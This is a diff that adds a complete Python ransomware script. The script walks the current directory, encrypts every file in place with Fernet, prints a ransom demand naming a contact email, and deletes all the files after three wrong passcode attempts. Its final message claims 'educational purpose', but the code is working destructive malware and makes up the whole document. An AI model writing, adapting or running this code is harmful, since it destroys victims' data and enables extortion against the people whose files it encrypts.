@@ -1,0 +1,50 @@
+import os
+import shutil
+from cryptography.fernet import Fernet
+# 1. Initialize file paths
+file_paths = []
+for root, dirs, files in os.walk("."):
+ for file in files:
+ file_paths.append(os.path.join(root, file))
+# 2. Generate encryption key and encrypt files
+key = Fernet.generate_key()
+for file in file_paths:
+ with open(file, "rb") as readfile:
+ content = readfile.read()
+ enc_contents = Fernet(key).encrypt(content)
+ with open(file, "wb") as writefile:
+ writefile.write(enc_contents)
+# 3. Ransom message and decryption attempts
+# Issue: The passcode is hardcoded, which is not secure.
+passcode = "ilovepython"
+attempts = 0
+while True:
+ print("ALL OF YOUR DATA HAS BEEN ENCRYPTED AND IF TRY TO ACT AS CLEVER AND CLOSE THE 
+PROGRAM THEN ALL DATA WILL BE LOST SO: \n I KINDLY REQUEST TO CONTACT ME AT abc@yahoo.com OR 
+you will never see your files again.")
+ if attempts == 3:
+ print("You have entered the wrong password three times. Your files have been deleted.")
+ for file in file_paths:
+ try:
+ os.remove(file)
+ except Exception as e:
+ print(f"Error deleting file {file}: {e}")
+ break
+ user_input = input("Enter the passcode to decrypt your files: ")
+ if user_input == passcode:
+ for file in file_paths:
+ with open(file, "rb") as readefile:
+ contents = readefile.read()
+ raw_contents = Fernet(key).decrypt(contents)
+ with open(file, "wb") as writefile:
+ writefile.write(raw_contents)
+ print("Passcode correct. Don't download files from unknown resources.")
+ break
+ else:
+ attempts += 1
+ print("Incorrect passcode. You have", 3 - attempts, "attempts remaining.")
+# 4. Printing 
+print("""
+IMPORTANT INFORMATION:
+1. Only for educational purpose next time be aware.For this time you data is lost.
+""")
